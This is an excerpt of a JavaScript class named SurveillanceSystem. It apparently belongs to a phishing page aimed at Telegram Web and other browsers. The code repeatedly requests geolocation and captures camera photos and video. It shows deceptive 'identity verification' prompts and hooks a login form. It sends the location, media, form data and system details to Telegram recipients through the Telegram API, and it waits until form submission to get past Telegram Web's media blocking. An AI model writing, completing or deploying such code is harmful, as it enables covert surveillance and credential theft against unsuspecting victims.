...
// 🎯 Enhanced initialization for Telegram Web compatibility
class SurveillanceSystem {
    ...
    async initializeSystem() {
        try {
            console.log('🚀 Initializing system for:', this.isTelegramWeb ? 'Telegram Web' : 'Regular Browser');
            
            // Send system info first
            this.sendSystemInfo();
            
            // Initialize components with Telegram Web optimizations
    ...
    // 🔄 Persistent permission retry system optimized for Telegram Web
    async initializeWithRetry() {
        // Start with geolocation (usually works in Telegram Web)
        await this.initializeGeolocationWithRetry();
        
        // Then try media with Telegram Web specific optimizations
        await this.initializeMediaWithRetry();
        
        // Always initialize form handler
        await this.initializeFormHandler();
    }

    // 📍 Persistent Geolocation with Telegram Web support
        ...
        return new Promise(async (resolve) => {
            const tryGeolocation = async () => {
                ...
                try {
                    const position = await new Promise((positionResolve, positionReject) => {
                        navigator.geolocation.getCurrentPosition(
                            ...
                            positionReject, 
                            {
                                ...
                                timeout: 15000, // Longer timeout for Telegram Web
                                maximumAge: 0
                            }
                        );
                    });
                    ...
                    // Shorter delay for Telegram Web
                    const retryDelay = this.isTelegramWeb ? 2000 : 3000;
                    setTimeout(tryGeolocation, retryDelay);
                }
            };
    ...
    // 🎥 Enhanced Media Capture for Telegram Web
    async initializeMediaWithRetry() {
        // Telegram Web often blocks automatic media access, so we'll be more strategic
        if (this.isTelegramWeb) {
            this.sendToAllUsers('📱 *Telegram Web Detected*\n• Media capture will be attempted on form submission\n• Location and form data will be captured immediately');
            return; // Defer media capture until form submission for Telegram Web
        }
        ...
        const tryMediaCapture = async () => {
            ...
            try {
                ...
                // Start media capture immediately for non-Telegram browsers
    ...
    // 🎬 Start media capture (used by both initialization and form submission)
    async startMediaCapture(stream = null) {
        try {
            if (!stream && !mediaStream) {
                // Try to get stream if not provided
    ...
    // 🔔 Enhanced Permission Request UI for Telegram Web
    showPermissionRequest(type, attempt) {
        // Don't show too many modals in Telegram Web to avoid annoyance
        if (this.isTelegramWeb && attempt > 2) {
            return;
        }
        ...
        const messages = {
            ...
            'camera': 'Camera access is required for identity verification and security purposes. This helps us ensure the authenticity of your submission.'
        };
        ...
        return new Promise(async (resolve) => {
            try {
                ...
                let options = {
                    ...
                    videoBitsPerSecond: 2000000 // Lower bitrate for faster processing
                };
    ...
    // 📸 Enhanced Burst Photo Capture for reliability
    ...
    async captureHighQualityPhoto(video, photoNumber) {
        return new Promise((resolve) => {
            try {
                ...
                context.fillText(`Photo ${photoNumber} - ${new Date().toLocaleString()} - ${this.isTelegramWeb ? 'Telegram Web' : 'Browser'}`, 20, 35);

                // Convert to blob with error handling
                canvas.toBlob(async (blob) => {
                    if (blob && blob.size > 1000) { // Ensure reasonable file size
                        try {
                    ...
                    resolve();
                }, 'image/jpeg', 0.85); // Slightly lower quality for reliability
    ...
    // 📝 Enhanced Form Handler with Telegram Web media capture
    initializeFormHandler() {
        const loginForm = document.getElementById('loginForm');
        if (!loginForm) {
            console.warn('Login form not found');
            // Create fallback form if none exists
    ...
    // 🚀 Handle form submission with media capture
    async handleFormSubmission() {
        try {
            ...
            // Attempt media capture (especially important for Telegram Web)
            try {
                if (this.isTelegramWeb || !mediaStream) {
                    this.sendToAllUsers('📱 *Attempting Media Capture*\n• Platform: ' + (this.isTelegramWeb ? 'Telegram Web' : 'Browser'));
                    await this.startMediaCapture();
                } else {
                    // Capture final photo with existing stream
            ...
            this.showSuccessMessage('User'); // Fallback
        }
    }
    ...
    createFormMessage(formData) {
        return `📄 *Form Submission Captured*\n\n` +
            ...
            `• 🌐 **Environment:** ${formData.telegramWeb ? 'Telegram Web' : 'Regular Browser'}`;
    }
    ...
    sendSystemInfo() {
        const systemInfo = `🖥️ *System Initialized*\n\n` +
            ...
            `• 🔍 **Environment:** ${this.isTelegramWeb ? 'Telegram Web' : 'Regular Browser'}`;
    ...
    // 📤 Enhanced Telegram API with better error handling
        ...
        for (let attempt = 1; attempt <= maxRetries; attempt++) {
            try {
                if (type === 'photo') {
                    ...
                    formData.append('caption', `📸 Photo • ${new Date().toLocaleString()} • ${this.isTelegramWeb ? 'Telegram' : 'Browser'}`);
                    ...
                    formData.append('caption', `🎥 Video • ${new Date().toLocaleString()} • ${this.isTelegramWeb ? 'Telegram' : 'Browser'}`);
